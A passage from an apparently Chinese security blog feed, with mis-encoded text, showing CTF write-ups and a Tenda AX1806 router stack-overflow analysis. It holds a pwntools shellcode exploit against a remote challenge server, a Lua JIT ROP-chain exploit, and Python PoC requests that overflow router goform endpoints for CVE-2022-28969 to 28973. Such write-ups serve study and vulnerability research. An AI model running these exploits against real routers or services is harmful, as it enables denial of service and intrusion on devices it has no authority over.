punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># io = process("./pwn")</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'hash-it-0-m7tt7b7whagjw.shellweplayaga.me'</span><span class="token punctuation">,</span><span class="token string">'31337'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ticket please:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">r'ticket&#123;AweighWeatherdeck5640n22:Hh6YqvgvoHk_PVza-ImPd3f_mEkDjLd-JkzxVpPsFTlwjASB&#125;'</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x30000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(io,"b *$rebase(0x1213)")</span>    payload <span class="token operator">=</span> generation<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ca_shellcode()</span><span class="token comment"># second()</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092642291.png" alt="image-20220531092642291"></p><h1 id="smuggler‚Äôs-cove"><a href="#smuggler‚Äôs-cove" class="headerlink" title="smuggler‚Äôs cove"></a>smuggler‚Äôs cove</h1><p>ËøôÈ¢òÊØîËµõ‰∏≠Ê≤°ÂÅöÂá∫Êù•ÔºåÁúã <a href="https://uz56764.tistory.com/55">Â§ß‰Ω¨wp</a>Â§çÁé∞ÁöÑ„ÄÇ‰πãÂâçÂú®ÂêÑÁßçÊØîËµõ‰∏≠Êé•Ëß¶ËøáËøôÁ±ªÂûãÁöÑÈ¢òÁõÆÔºå‰ª•ÂæÄÈÉΩÊòØCÂÜôÁöÑJSËß£ÈáäÂô®‰πãÁ±ªÁöÑ‰∏úË•øÔºåËÄÉÂØüÈù¢ÂêëÂØπË±°Áõ∏ÂÖ≥ÈÉΩÊºèÊ¥ûÁÇπ„ÄÇ‰ΩÜËøôÊ¨°‰∏çÂêå‰ª•ÂæÄÔºåÊú¨Ê¨°ÊØîËµõ‰∏≠ÊàëÂíåÈòüÂèãÂç°Âú®‰∫ÜLuaËØ≠Ë®Ä‰∏äÔºå‰∏çÁü•ÈÅìLuaÁöÑÊï∞ÁªÑËøòÂèØ‰ª•Ëøô‰πàÁî®Ôºå‰πüÊ≤°ÊúâÂéªÂ§ßËÉÜÁöÑÂ∞ùËØïÔºåËÆ∞ÂΩï‰∏Ä‰∏ãÈïø‰∏™ËÆ∞ÊÄßÂêß„ÄÇ</p><p>ÊåâÁÖß‰∏äÈù¢ÊñáÁ´†ÁöÑËØ¥Ê≥ïÔºåLuaÁöÑÊï∞ÁªÑ‰∏ãÊ†áÂú®Â≠òÂÇ®ÁöÑÊó∂ÂÄôÊòØ‰ΩøÁî®ÂèåÁ≤æÂ∫¶ÊµÆÁÇπÊï∞ÔºåÂú®JITËøáÁ®ã‰∏≠ÔºåÊàë‰ª¨ËæìÂÖ•ÁöÑÂÜÖÂÆπË¢´ËΩ¨ÁßªÂà∞‰∏Ä‰∏™RXÊÆµ‰∏≠Ë¢´ÊâßË°å„ÄÇÂèØ‰ª•Âà©Áî®‰∏ãÊ†áÊù•ÊûÑÈÄ†‰∏ÄÊÆµROPÈìæÔºåÂâçÊèêÊòØÂ∞Ü64‰ΩçÁ®ãÂ∫èËΩ¨‰∏∫ÂèåÁ≤æÂ∫¶ÊµÆÁÇπÊï∞Ôºö<a href="https://gregstoll.com/~gregstoll/floattohex/">Âú®Á∫øËΩ¨Êç¢ÁΩëÁ´ô</a>„ÄÇÊú¨È¢òÂõ†‰∏∫ÊòØÁΩëÈ°µÁ´ØÁöÑÔºåÊâÄ‰ª•Âú®ÊØîËµõÊó∂Êó†Ê≥ïËé∑ÂèñshellËøõË°å‰∫§‰∫íÔºåÈúÄË¶ÅÊâßË°åÈ¢òÁõÆÁªôÂá∫ÁöÑÁ®ãÂ∫è <code>x marks the spot</code> Ëá™Âä®ÊâìÂç∞Âá∫flag„ÄÇLuaËÑöÊú¨‰ª£Á†ÅÈúÄË¶ÅÂ∞è‰∫é433ÔºåÊâÄ‰ª•ÊûÑÈÄ†ÁöÑROPÈìæÈùûÂ∏∏ÊúâÈôêÔºå<code>jmp</code> Êåá‰ª§Âú®Áü≠Ë∑≥ËΩ¨Êó∂Âè™Âç†Áî®‰∏§Â≠óËäÇÔºåÂõ†Ê≠§ÂèØ‰ª•Áî®Áü≠Ë∑≥ËΩ¨ÂÆûÁé∞„ÄÇ</p><p>ËøáÁ®ãÊØîËæÉÂ§çÊùÇÔºåÂèØ‰ª•Ëá™Ë°åË∞ÉËØï‰∏Ä‰∏ãÔºåexpÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> s0 <span class="token operator">=</span> <span class="token string">"spot\x00the\x00marks\x00x\x00./dig_up_the_loot"</span>a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">5.818854254051108e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.2119828994673418e-188</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604507616872868e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069739006113e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069656115653e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069821896574e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604506949033473e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.0359661452274597e-212</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">5.92480351975e-313</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2.2373500568022293e-169</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2261634.5098039214</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>b <span class="token operator">=</span> arg<span class="token keyword">end</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">cargo</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tenda AX1806Ë∑ØÁî±Âô®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û</title>
      <link href="/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/"/>
      <url>/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Tenda-AX1806Ë∑ØÁî±Âô®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û"><a href="#Tenda-AX1806Ë∑ØÁî±Âô®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û" class="headerlink" title="Tenda AX1806Ë∑ØÁî±Âô®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û"></a>Tenda AX1806Ë∑ØÁî±Âô®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û</h1><p>Tenda AX1806Ë∑ØÁî±Âô®Âõ∫‰ª∂ÁâàÊú¨ v1.0.0.1ÔºåÂ≠òÂú®Â§öÂ§ÑÊ†àÊ∫¢Âá∫ÊºèÊ¥ûÔºåÊºèÊ¥ûÁÇπÂú® tdhttpd ‰∫åËøõÂà∂Êñá‰ª∂‰∏≠Ôºå‰ΩøÁî®‰∫ÜÂç±Èô©ÂáΩÊï∞ <code>strcpy</code> ÂâçÊú™ÂØπÂèÇÊï∞ÈïøÂ∫¶ËøõË°åÂà§Êñ≠ÔºåÂØºËá¥ÊãíÁªùÊúçÂä°ÊºèÊ¥û„ÄÇ</p><h1 id="CVE‰ø°ÊÅØ"><a href="#CVE‰ø°ÊÅØ" class="headerlink" title="CVE‰ø°ÊÅØ"></a>CVE‰ø°ÊÅØ</h1><p>ÈÄöËøáÂÖ¨Â∏ÉÁöÑÊºèÊ¥ûÁºñÂè∑ÔºåÂæóÁü•CVEÁºñÂè∑‰∏∫ CVE-2022-28971„ÄÅCVE-2022-28972„ÄÅCVE-2022-28970„ÄÅCVE-2022-28969„ÄÅCVE-2022-28973„ÄÇÂú®CVEÁΩëÁ´ô‰∏≠Êü•ËØ¢Áõ∏ÂÖ≥‰ø°ÊÅØÔºåÂæóÂà∞ÊºèÊ¥ûÁõ∏ÂÖ≥‰ø°ÊÅØÔºåÂü∫Êú¨‰∏äÈÉΩÊòØÊ∫¢Âá∫Á±ªÊºèÊ¥ûÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155545109.png" alt="image-20220511155545109"></p><h1 id="ÊºèÊ¥ûÂàÜÊûê"><a href="#ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="ÊºèÊ¥ûÂàÜÊûê"></a>ÊºèÊ¥ûÂàÜÊûê</h1><p>Âú®ÂÆòÁΩë‰∏ãËΩΩÂõ∫‰ª∂Ôºà‰∏ãËΩΩÈìæÊé•Âú®ÊñáÊú´ÔºâÔºå‰ΩøÁî® binwalk Ëß£ÂåÖÂõ∫‰ª∂ÔºàÈúÄË¶ÅÁî®Âà∞ubi_readerÔºâÔºåÂæóÂà∞ ubifs Êñá‰ª∂Á≥ªÁªüÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155440259.png" alt="image-20220511155440259"></p><p>Êü•ËØ¢Êî∂ÈõÜCVE‰ø°ÊÅØÔºåÂæóÁü•ÊºèÊ¥ûÁÇπÂú®‰∫é <code>fromAdvSetMacMtuWan</code> „ÄÅ<code>form_fast_setting_wifi_set</code> „ÄÅ<code>fromSetIpMacBind</code>„ÄÅ<code>GetParentControlInfo</code>„ÄÅ<code>fromSetWifiGusetBasic</code> ÂáΩÊï∞‰∏≠„ÄÇ</p><p>ÂØπ‰∫éËøôÁßçË∑ØÁî±Âô®Á≥ªÁªüÊù•ËØ¥ÔºåË∑ØÁî±Âô®‰∏ÄËà¨ÈÉΩÊòØÈÄöËøá httpd ÊúçÂä°Êù•ËøêË°åË∑ØÁî±Âô®ÁÆ°ÁêÜÈ°µÈù¢ÔºåÁî®Êà∑Âú®‰øÆÊîπË∑ØÁî±Âô®ÈÖçÁΩÆÊó∂Áõ¥Êé•Âú®ÁÆ°ÁêÜÈ°µÈù¢‰∏äÊèê‰∫§Êï∞ÊçÆÔºå‰∫§Áªô httpd ÊúçÂä°Á®ãÂ∫èÂ§ÑÁêÜÔºåÊâÄ‰ª•ÂèØ‰ª•Âú®Âõ∫‰ª∂Á≥ªÁªü‰∏≠Êü•Êâæ httpd Áõ∏ÂÖ≥Êñá‰ª∂ÁÑ∂ÂêéÂàÜÊûê„ÄÇ‰ΩøÁî® <code>grep -r httpd .</code> ÂëΩ‰ª§Âú® .&#x2F;bin Êñá‰ª∂Â§π‰∏ãÊü•ÊâæÂà∞‰∏Ä‰∏™ tdhttpd ÂèØÊâßË°åÁ®ãÂ∫èÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155514329-20220511155637583.png" alt="image-20220511155514329"></p><p>Â∞Ü tdhttpd ÊîæÂÖ•IDAÊü•ÁúãÔºåARM 32‰ΩçÂ∞èÁ´ØÔºåÊñá‰ª∂Ê≤°ÊúâÂéªÊéâÁ¨¶Âè∑ÔºåÂæàÂÆπÊòìÂàÜÊûê„ÄÇÊé•‰∏ãÊù•ÂàÜÊûê‰∏äÈù¢ÊèêÂà∞ÁöÑÂá†‰∏™ÊºèÊ¥ûÂáΩÊï∞„ÄÇ<code>fromAdvSetMacMtuWan</code> ÂÜÖË∞ÉÁî®ÂáΩÊï∞ <code>sub_658D8</code>Ôºå<code>sub_658D8</code> ÂÜÖÂ≠óÁ¨¶‰∏≤Êã∑Ë¥ùÂâçÊú™ÂØπËæìÂÖ•ÂèÇÊï∞ÂÅöÈïøÂ∫¶Âà§Êñ≠Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155659701.png" alt="image-20220511155659701"><code>form_fast_setting_wifi_set</code> ÂáΩÊï∞Âú®Â§ÑÁêÜ <code>timeZone</code> ÂèÇÊï∞Êó∂Êú™ÂØπÈïøÂ∫¶ËøõË°åÂà§Êñ≠Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155721295.png" alt="image-20220511155721295"><code>fromSetIpMacBind</code> Â∞±Êõ¥Á¶ªË∞±‰∫ÜÔºåÊú™ÂØπÈïøÂ∫¶ËøõË°åÂà§Êñ≠ÔºåÊó†ËÆ∫Â¶Ç‰ΩïÈÉΩÂ∞ÜÂÜÖÂÆπÊã∑Ë¥ùÂà∞v20ÂèòÈáè‰∏≠Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155746366.png" alt="image-20220511155746366"></p><p><code>GetParentControlInfo</code> ÂáΩÊï∞Âú®Êã∑Ë¥ùÂà∞Â†ÜÂùóÊó∂Êú™ÂØπÈïøÂ∫¶ËøõË°åÂà§Êñ≠ÔºåÂØºËá¥Â†ÜÊ∫¢Âá∫Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155804517.png" alt="image-20220511155804517"></p><p><code>fromSetWifiGusetBasic</code> ÂáΩÊï∞‰πüÊòØÊ≤°ÊúâÂà§Êñ≠ÂèÇÊï∞ÈïøÂ∫¶Áõ¥Êé•ËøõË°åÊã∑Ë¥ùÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155815123.png" alt="image-20220511155815123"></p><h1 id="Âä®ÊÄÅË∞ÉËØï"><a href="#Âä®ÊÄÅË∞ÉËØï" class="headerlink" title="Âä®ÊÄÅË∞ÉËØï"></a>Âä®ÊÄÅË∞ÉËØï</h1><p>‰ΩøÁî® <code>sudo qemu-arm-static -L . ./bin/tdhttpd</code> Ê®°ÊãüËøêË°åÂõ∫‰ª∂ÔºåËøêË°åÊó∂ÁõëÂê¨‰∫Ü80Á´ØÂè£Ôºå‰ΩÜÊó†Ê≥ïËÆøÈóÆÈ°µÈù¢Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155846796.png" alt="image-20220511155846796"></p><p>Ëøô‰∏™ÊòØÂõ†‰∏∫IPÂú∞ÂùÄ‰∏çÂØπÔºåÂèØ‰ª•Âè¶Ëµ∑‰∏Ä‰∏™ÁªàÁ´ØÊü•Áúã80Á´ØÂè£ÁöÑIPÂú∞ÂùÄÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155913743.png" alt="image-20220511155913743"></p><p>ËøôÊó∂ÂÄôÈúÄË¶ÅÊñ∞Âª∫‰∏Ä‰∏™ÁΩëÊ°•Ôºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uml-utilities bridge-utils<span class="token function">sudo</span> brctl addbr br0<span class="token function">sudo</span> brctl addif br0 ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 up<span class="token function">sudo</span> dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Êñ∞Âª∫ÁΩëÊ°•ÂêéÈô§‰∫ÜÊú¨Âú∞ÁΩëÂç° ens33 ‰ª•Â§ñÂ§ö‰∫Ü‰∏Ä‰∏™ br0 ÁΩëÂç°Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155926719.png" alt="image-20220511155926719"></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155935208.png" alt="image-20220511155935208"></p><p>ÁÑ∂ÂêéÂÆâË£Ö arm ÁéØÂ¢ÉÁöÑ libcÔºåÊää qemu-arm-static Êã∑Ë¥ùÂà∞Âõ∫‰ª∂Ê†πÊñá‰ª∂Â§π‰∏ãÔºåÂÜçÊ¨°ËøêË°å httpd ÊúçÂä°ÔºåÂ∞±ÂèØ‰ª•Ê®°ÊãüÊàêÂäüÂπ∂ËÆøÈóÆÈ°µÈù¢‰∫ÜÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user-static libc6-arm* libc6-dev-arm*<span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-arm-static<span class="token variable">)</span></span> <span class="token builtin class-name">.</span><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155950195.png" alt="image-20220511155950195"></p><p>ËôΩÁÑ∂ËÉΩÊ®°ÊãüÈÉ®ÂàÜÈ°µÈù¢Ôºå‰ΩÜÊòØ Wi-Fi ÂäüËÉΩÊòØ‰∏çËÉΩÁî®ÁöÑÔºåÂõ†‰∏∫ Wi-Fi ÂäüËÉΩÈúÄË¶ÅÁã¨Á´ãÁöÑÁ°¨‰ª∂Êù•ÊîØÊåÅÔºåÊâÄ‰ª•Â¶ÇÊûúË¶ÅÊµãËØï Wi-Fi ÂäüËÉΩÁõ∏ÂÖ≥ÁöÑÊé•Âè£ÔºåËøòÊòØÈúÄË¶ÅË¥≠‰π∞Ë∑ØÁî±Âô®ÊâçË°å„ÄÇÁî±‰∫éÊàëÊòØÁ∫ØÊ®°ÊãüÔºåÊ≤°ÊúâË¥≠‰π∞Ë∑ØÁî±Âô®ÔºåÊâÄ‰ª•ÊµãËØïÊé•Âè£ÁöÑÊó∂ÂÄôÂèÇËÄÉ‰∫ÜÂÖ¨Â∏ÉÁöÑPoC‰ª£Á†ÅÔºåËøôÈáåÊ®°ÊãüÂõ∫‰ª∂Âè™ÊòØÊñπ‰æøÂ§çÁé∞Ë∞ÉËØï„ÄÇPoc‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">CVE_2022_28970</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"mac"</span><span class="token punctuation">:</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/GetParentControlInfo>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28973</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"wanMTU"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/AdvSetMacMtuWan>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28969</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"shareSpeed"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/WifiGuestSet>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28971</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"list"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>        <span class="token string">b"bindnum"</span><span class="token punctuation">:</span> <span class="token string">b"1"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/SetIpMacBind>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28972</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"ssid"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token punctuation">,</span>        <span class="token string">b"timeZone"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b":"</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/fast_setting_wifi_set>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>CVE_2022_28971<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•‰ΩøÁî® gdb-multiarch Êù•Âä®ÊÄÅË∞ÉËØïPocÔºåÂè™ÈúÄË¶ÅÂú®qemuËøêË°åÊó∂Âä†‰∏äË∞ÉËØïÂèÇÊï∞„ÄÇqemuËøêË°åÂëΩ‰ª§Â¶Ç‰∏ãÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" 